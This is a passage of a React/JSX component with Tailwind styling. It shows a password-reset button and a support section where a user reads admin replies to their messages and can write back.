                      className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                    />
                  </div>
                  <button
                    onClick={handleForgotPassword}
                    className="w-full rounded-3xl bg-orange-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-orange-400"
                  >
                    Send Reset Link
                  </button>
                </div>
              </div>
            </div>
          </aside>
        </section>

        <section className="mt-6 glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
          <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
            <div>
              <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">Support & Messages</p>
              <h2 className="mt-2 text-2xl font-semibold">Admin Replies & Updates</h2>
            </div>
            <span className="rounded-full bg-slate-900/80 px-4 py-2 text-xs uppercase tracking-[0.3em] text-slate-300 border border-slate-700">
              {supportMessages.filter((msg: any) => msg.adminReply).length} replies
            </span>
          </div>

          <div className="mt-6 space-y-4">
            {supportMessages.length === 0 ? (
              <p className="text-slate-400">No messages yet.</p>
            ) : (
              supportMessages.map((msg) => (
                <div key={msg.id} className="rounded-3xl border border-white/10 bg-slate-950/80 p-5">
                  <div className="flex items-center justify-between gap-3 mb-3">
                    <span className="text-[10px] uppercase tracking-[0.3em] text-slate-500">{msg.from} - {new Date(msg.time).toLocaleTimeString()}</span>
                    {msg.adminReply && <span className="text-green-400 text-xs font-semibold">✓ REPLIED</span>}
                  </div>
                  <p className="text-sm leading-7 text-slate-200"><strong>Your message:</strong> {msg.message}</p>
                  
                  {msg.adminReply && (
                    <div className="mt-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/20 p-4">
                      <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-2">Admin Reply - {msg.adminReplyTime ? new Date(msg.adminReplyTime).toLocaleTimeString() : ''}</p>
                      <p className="text-sm text-slate-100">{msg.adminReply}</p>
                      {selectedMessageId !== msg.id && (
                        <button
                          onClick={() => setSelectedMessageId(msg.id)}
                          className="mt-3 text-cyan-300 text-xs hover:underline"
                        >
                          Reply to Admin
                        </button>
                      )}
                      {selectedMessageId === msg.id && (
                        <div className="mt-3">
                          <textarea
                            value={replyText}
                            onChange={(e) => setReplyText(e.target.value)}
                            placeholder="Type your reply here"
                            className="w-full rounded-2xl border border-white/10 bg-slate-900/80 px-4 py-2 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                          />
                          <button
                            onClick={() => handleReplyToAdmin(msg.id)}
                            className="mt-2 rounded-2xl bg-cyan-500 px-4 py-2 text-sm font-semibold text-black hover:bg-cyan-400"
                          >
                            Send Reply
                          </button>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        </section>
      </div>
    </div>
  );
}